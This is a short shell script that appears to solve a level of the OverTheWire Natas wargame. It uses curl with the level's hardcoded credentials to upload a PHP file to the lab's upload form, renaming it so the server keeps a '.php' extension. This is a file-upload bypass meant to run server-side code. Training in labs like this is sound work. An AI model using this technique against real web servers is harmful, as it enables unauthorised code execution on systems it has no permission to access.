usr="natas13"
psw="jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
filename="ciao.php"
file="natas13.upload.php"

curl --user "$usr:$psw" -X POST --form "MAX_FILE_SIZE=1000" --form "filename=$filename" --form "uploadedfile=@$file;filename=prova.php" http://natas13.natas.labs.overthewire.org/ 
